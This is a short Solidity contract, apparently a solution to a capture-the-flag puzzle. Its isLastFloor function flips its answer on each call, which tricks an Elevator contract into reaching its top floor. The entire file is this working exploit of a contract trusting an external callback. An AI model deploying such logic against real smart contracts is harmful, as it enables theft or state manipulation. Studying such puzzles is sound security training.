// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint256 floor) external;
}

contract ElevatorHack {
    bool private lastFloor = true;

    constructor() {}

    function attack(address _victim) external {
        IElevator(_victim).goTo(69);
    }

    function isLastFloor(uint256 _floor) external returns (bool) {
        lastFloor = !lastFloor;
        return lastFloor;
    }
}
